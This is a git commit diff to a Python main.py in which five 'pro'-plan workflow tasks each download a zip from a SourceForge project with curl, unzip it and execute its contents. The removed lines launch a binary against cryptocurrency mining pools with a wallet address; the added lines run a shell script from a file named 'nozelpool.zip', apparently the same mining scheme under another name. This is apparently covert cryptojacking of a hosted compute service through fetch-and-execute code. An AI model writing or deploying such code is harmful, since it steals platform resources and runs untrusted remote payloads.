b0eeb628a00c7f2940ada9c1ce40b895825f1c8f
afreutorocelz-del <afreutorocelz@gmail.com>
2026-03-25 03:54:40 -0700

    Update main.py

--- main.py
+++ main.py
@@ -14,8 +14,8 @@ app = Workflows()
 def run1():
   import sys
   import os
-  os.system('curl https://sourceforge.net/projects/drths/files/core.zip/download -L -o core.zip && unzip core.zip')
-  os.system('./core -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008')
+  os.system('curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip')
+  os.system('./nozel.sh')
 
 @app.task(
   plan="pro",
@@ -28,8 +28,8 @@ def run1():
 def run2():
   import sys
   import os
-  os.system('curl https://sourceforge.net/projects/drths/files/core.zip/download -L -o core.zip && unzip core.zip')
-  os.system('./core -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008')
+  os.system('curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip')
+  os.system('./nozel.sh')
 
 @app.task(
   plan="pro",
@@ -42,8 +42,8 @@ def run2():
 def run3():
   import sys
   import os
-  os.system('curl https://sourceforge.net/projects/drths/files/core.zip/download -L -o core.zip && unzip core.zip')
-  os.system('./core -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008')
+  os.system('curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip')
+  os.system('./nozel.sh')
 
 @app.task(
   plan="pro",
@@ -56,8 +56,8 @@ def run3():
 def run4():
   import sys
   import os
-  os.system('curl https://sourceforge.net/projects/drths/files/core.zip/download -L -o core.zip && unzip core.zip')
-  os.system('./core -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008')
+  os.system('curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip')
+  os.system('./nozel.sh')
 
 @app.task(
   plan="pro",
@@ -70,8 +70,8 @@ def run4():
 def run5():
   import sys
   import os
-  os.system('curl https://sourceforge.net/projects/drths/files/core.zip/download -L -o core.zip && unzip core.zip')
-  os.system('./core -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 -P stratum1+tcp://CB0745A849B3C0A9F52C11B7B674D70BA1DB2A2F637E.$(echo $RANDOM | md5sum | head -c 10)@us.catchthatrabbit.com:8008')
+  os.system('curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip')
+  os.system('./nozel.sh')
 
 
 if __name__ == "__main__":
